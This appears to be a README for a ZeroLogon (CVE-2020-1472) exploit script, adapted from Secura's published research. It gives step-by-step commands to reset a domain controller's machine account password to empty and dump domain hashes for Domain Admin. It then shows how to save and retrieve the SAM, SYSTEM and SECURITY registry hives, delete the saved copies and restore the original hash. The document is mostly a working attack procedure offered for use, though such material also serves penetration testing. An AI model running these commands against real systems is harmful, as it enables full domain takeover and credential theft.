# ZeroLogon exploitation script

Exploit code based on https://www.secura.com/blog/zero-logon and https://github.com/SecuraBV/CVE-2020-1472. Original research and scanner by Secura, modifications by RiskSense Inc.

To exploit, clear out any previous Impacket installs you have and install Impacket from https://github.com/SecureAuthCorp/impacket/commit/b867b21 or newer. Then, do:

```
python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR
```

If that's successful you will then be able to:
```
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
```
which should get you Domain Admin. After you have that, wmiexec.py to the target DC with a credential from the secretsdump and do
```
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.save
get security.save
del /f system.save
del /f sam.save
del /f security.save
```

Then you can
```
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```
And that should show you the original NT hash of the machine account. You can then re-install that original machine account hash to the domain by
```
python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH
```

Reinstalling the original hash is necessary for the DC to continue to operate normally.
